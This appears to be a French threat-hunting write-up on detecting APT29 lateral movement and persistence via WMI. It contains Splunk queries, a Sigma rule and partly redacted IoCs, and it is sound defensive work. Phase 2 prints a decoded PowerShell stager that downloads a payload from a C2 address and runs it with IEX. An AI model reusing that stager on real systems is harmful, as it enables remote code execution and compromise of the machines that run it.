# Chasse aux TTPs d'APT29 : Mouvement latéral via WMI

## Contexte & Hypothèse de Hunt

Lors d'une mission de threat hunting sur un environnement Active Directory, une anomalie comportementale a attiré l'attention : des processus `WmiPrvSE.exe` engendrant des connexions réseau inhabituelles vers plusieurs postes de travail en dehors des horaires de bureau.

**Hypothèse initiale :**
> *Un acteur malveillant utilise WMI pour exécuter des commandes à distance sur des hôtes internes, sans passer par des protocoles plus surveillés comme PSExec ou RDP.*

Cette technique correspond à [T1021.006 - Remote Services: Windows Remote Management](https://attack.mitre.org/techniques/T1021/006/) et [T1047 - Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/) dans le framework MITRE ATT&CK.

---

## Environnement & Outils

| Outil | Usage |
|---|---|
| Splunk Enterprise | SIEM principal, requêtes SPL |
| Sysmon v15 | Télémétrie endpoint enrichie |
| Velociraptor | Forensics live sur les hôtes suspects |
| MISP | Corrélation CTI / IoCs APT29 |
| BloodHound | Cartographie AD pour valider les chemins d'attaque |

---

## Phase 1 : Détection initiale

La première requête cible les processus enfants de `WmiPrvSE.exe`, qui ne devrait normalement pas en avoir dans notre baseline :

```splunk
index=windows source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
EventCode=1
ParentImage="*\\WmiPrvSE.exe"
NOT (Image IN ("*\\WmiPrvSE.exe", "*\\WmiApSrv.exe"))
| stats count by host, Image, CommandLine, ParentCommandLine
| where count < 5
| sort - count
```

**Résultat :** 3 hôtes affichent des exécutions de `powershell.exe` enfant de `WmiPrvSE.exe`, avec des command lines encodées en base64.

---

## Phase 2 : Décodage & Analyse du payload

Le décodage des commandes PowerShell révèle un stager classique :

```powershell
# Après décodage du base64
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent","Mozilla/5.0 (compatible)")
$payload = $wc.DownloadString("https://[REDACTED]/update.png")
IEX $payload
```

Le domaine C2 matche avec l'infrastructure connue d'APT29 dans notre feed MISP (cluster `threat-actor="APT29"`).

---

## Phase 3 : Expansion du périmètre

Avec les hôtes compromis identifiés, on cherche d'autres formes de persistance WMI :

```splunk
index=windows source="XmlWinEventLog:Microsoft-Windows-WMI-Activity/Operational"
EventCode IN (5857, 5858, 5859, 5860, 5861)
| eval type=case(
    EventCode=5861, "WMI Subscription CREATE",
    EventCode=5860, "WMI Filter CREATE",
    EventCode=5859, "WMI Consumer CREATE",
    true(), "Other")
| search type="WMI Subscription CREATE" OR type="WMI Filter CREATE"
| stats count by host, type, Message
| sort - count
```

**Découverte critique :** 2 hôtes ont des WMI Event Subscriptions persistantes, signées avec des noms imitant des logiciels légitimes (`WindowsUpdateMonitor`, `SysHealthCheck`).

---

## Règles de Détection (Sigma)

Voici les règles Sigma produites à l'issue de ce hunt :

```yaml
title: WMI Child Process Execution
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: stable
description: >
  Détecte l'exécution de processus enfants depuis WmiPrvSE.exe,
  indicateur de mouvement latéral ou d'exécution distante via WMI.
references:
  - https://attack.mitre.org/techniques/T1047/
author: VotreNom
date: 2024/11/15
tags:
  - attack.lateral_movement
  - attack.t1047
  - attack.t1021.006
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\WmiPrvSE.exe'
  filter_legit:
    Image|endswith:
      - '\WmiPrvSE.exe'
      - '\WmiApSrv.exe'
      - '\msiexec.exe'
  condition: selection and not filter_legit
falsepositives:
  - Logiciels de monitoring WMI légitimes
  - Scripts d'administration internes
level: high
```

---

## Indicateurs de Compromission (IoCs)

> ⚠️ IoCs anonymisés — les valeurs réelles ont été transmises au CERT.

| Type | Valeur | Confiance |
|---|---|---|
| Domain | `update-cdn[.]delivery` | Haute |
| IP | `185.220.xxx.xxx` | Haute |
| Hash SHA256 | `e3b0c44298fc1c149afb...` | Moyenne |
| WMI Filter Name | `WindowsUpdateMonitor` | Haute |
| Mutex | `Global\{DEADBEEF-...}` | Haute |

---

## Conclusion & Leçons apprises

Cette investigation confirme l'utilisation par APT29 de WMI comme vecteur de mouvement latéral "low and slow" — peu de bruit, contournement des solutions EDR mal configurées.

**Points clés :**
- Activer la journalisation WMI (Event IDs 5857-5861) en priorité
- Baselines des processus enfants de `WmiPrvSE.exe`
- Alerter sur toute création de WMI Subscription hors fenêtres de maintenance
- Corréler avec la CTI APT29 pour les IoCs réseau

Le dépôt GitHub contient les règles Sigma complètes et les playbooks d'investigation associés.
